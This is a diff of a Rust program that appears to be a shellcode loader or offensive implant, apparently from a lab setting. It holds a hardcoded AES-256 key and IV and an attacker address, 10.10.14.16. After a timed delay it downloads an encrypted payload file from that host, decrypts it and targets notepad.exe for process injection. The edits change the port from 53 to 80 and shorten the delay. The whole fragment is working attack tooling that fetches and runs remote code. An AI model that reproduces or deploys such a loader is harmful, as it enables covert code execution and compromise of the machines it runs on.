@@ -15,8 +15,8 @@ type Aes256CbcDec = Decryptor<Aes256>;
 const KEY_HEX: &str = "359d003b202332e5630cdef69702dff35cc946f6cc9efd4cbad7c0b401660e4a";
 const IV_HEX: &str = "34421aedd8bc5caec8a9075aa67bf9aa";
 
-const REMOTE_IP: &str = "10.10.14.16";
-const REMOTE_PORT: &str = "53";
+const REMOTE_PAYLOAD_IP: &str = "10.10.14.16";
+const REMOTE_PAYLOAD_PORT: &str = "80";
 
 const FILE_PATH: &str = "s.bin";
 const INJECTION_PROCESS: &str = "C:\\windows\\system32\\notepad.exe";
@@ -46,16 +46,16 @@ fn main() {
             if !ip.is_empty() && !port.is_empty() {
                 (ip.to_string(), port.to_string())
             } else {
-                (REMOTE_IP.to_string(), REMOTE_PORT.to_string())
+                (REMOTE_PAYLOAD_IP.to_string(), REMOTE_PAYLOAD_PORT.to_string())
             }
         } else {
-            (REMOTE_IP.to_string(), REMOTE_PORT.to_string())
+            (REMOTE_PAYLOAD_IP.to_string(), REMOTE_PAYLOAD_PORT.to_string())
         }
     } else {
-        (REMOTE_IP.to_string(), REMOTE_PORT.to_string())
+        (REMOTE_PAYLOAD_IP.to_string(), REMOTE_PAYLOAD_PORT.to_string())
     };
 
-    wait(Duration::from_secs(40));
+    wait(Duration::from_secs(20));
     let key = decode_hex::<32>(KEY_HEX);
     let encrypted_data = download_file(&remote_ip, &remote_port, FILE_PATH).unwrap();
     let data = decrypt_data(&key, encrypted_data);
